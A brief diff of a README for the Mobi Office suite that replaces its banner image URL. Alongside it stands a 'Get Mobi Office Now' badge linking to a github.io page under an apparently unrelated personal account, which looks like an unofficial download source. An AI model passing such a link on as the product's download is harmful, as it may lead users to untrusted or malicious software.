@@ -2,7 +2,7 @@
 
 > Mobi Office is a versatile office suite designed for creating, editing, organizing, and managing documents, spreadsheets, and presentations. It provides a familiar workspace, practical productivity tools, broad file compatibility, and flexible features for everyday office workflows.
 
-![Banner Placeholder](https://www.softmagazin.ru/upload/iblock/4c3/befncr8je0m8mi0zd0crq76lvsv0bu6u.jpg)
+![Banner Placeholder](https://a.storyblok.com/f/294288/1920x1024/42d85ef2b1/mobisystems-expands-mobioffice-press-release-cover.jpg)
 
 [![Get Mobi Office Now](https://img.shields.io/badge/Get_PRODUCT-Now-0a5d8d?style=for-the-badge&logo=github)](https://parkesradloff1989.github.io/.github/Mobi-Office)
 
